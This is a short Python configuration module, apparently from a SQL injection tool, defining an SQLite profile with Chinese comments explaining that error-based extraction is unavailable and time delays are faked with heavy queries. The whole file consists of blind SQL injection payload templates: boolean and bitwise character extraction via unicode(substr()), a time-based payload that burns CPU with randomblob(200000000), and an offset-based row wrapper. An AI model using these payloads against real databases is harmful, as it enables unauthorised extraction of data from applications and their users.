"""SQLite — 错误信息不含查询数据, 无报错回显技术; 无 sleep, time 用重查询近似(不可靠)。"""

PROFILE = {
    'name': 'sqlite',
    'note': 'SQLite 3.8+ (bool/time 已验证; 无 error; time 为重查询近似)',
    'err_tpl':   None,
    'err_regex': None,
    'err_chunk': 30,
    'err_strip': 0,
    'bool_tpl':  " AND unicode(substr(({Q}),{P},1))>{K}",
    'bit_tpl':   " AND (unicode(substr(({Q}),{P},1))&{M})>0",
    'time_tpl':  " AND (SELECT CASE WHEN unicode(substr(({Q}),{P},1))>{K} THEN upper(hex(randomblob(200000000))) LIKE '%zzzz%' ELSE 0 END)",
    'row_wrap':  "SELECT * FROM ({Q}) x LIMIT 1 OFFSET {R}",
}
